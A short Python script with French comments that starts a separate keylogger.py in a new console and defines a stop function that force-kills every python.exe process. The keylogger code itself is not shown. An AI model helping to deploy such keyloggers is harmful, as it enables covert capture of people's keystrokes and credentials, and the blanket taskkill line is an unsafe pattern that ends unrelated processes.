import subprocess
import time

def start_keylogger():
    subprocess.Popen(["python", "keylogger.py"], creationflags=subprocess.CREATE_NEW_CONSOLE)

def stop_keylogger():
    subprocess.run(["taskkill", "/f", "/im", "python.exe", "/t"])

# Démarrer le keylogger
start_keylogger()

# Le script principal peut continuer à s'exécuter ou se terminer ici
# Dans cet exemple, laissons le programme principal en cours d'exécution pendant quelques secondes
#time.sleep(10)

# Arrêter le keylogger lorsque nécessaire (dans cet exemple, après 10 secondes)
#stop_keylogger()
